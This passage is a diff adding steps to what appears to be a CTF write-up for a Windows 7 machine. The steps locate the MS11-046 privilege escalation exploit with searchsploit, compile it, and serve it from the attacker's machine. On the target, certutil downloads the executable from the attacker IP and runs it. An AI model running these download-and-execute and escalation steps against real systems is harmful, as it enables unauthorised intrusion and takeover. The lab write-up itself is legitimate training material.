@@ -86,8 +86,37 @@ systeminfo
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/89b2ddc2-3b53-41b6-9dc8-56745f3290dc)
 
+Search  `windows 7 build 7600 x86 privilege escalation` on the internet.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5f6364c1-4f41-4730-be7a-50517bec0105)
 
 
+```
+searchsploit ms11-046
+
+searchsploit -m 40564
+
+sed -n '60,70p' 40564.c
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ab0cef06-f654-4927-88ed-0cc94bdc4a2f)
+
+```
+# On the kali attack vm:
+# Compile:
+i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
+
+sudo python3 -m http.server
+
+# On the target machine:
+cd Users\Public\Downloads
+
+certutil.exe -urlcache -split -f "http://10.10.14.24:8000/MS11-046.exe" MS11-046.exe
+
+MS11-046.exe
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bdb02526-aad4-4391-86f4-7160e7e7ab36)
 
 
 
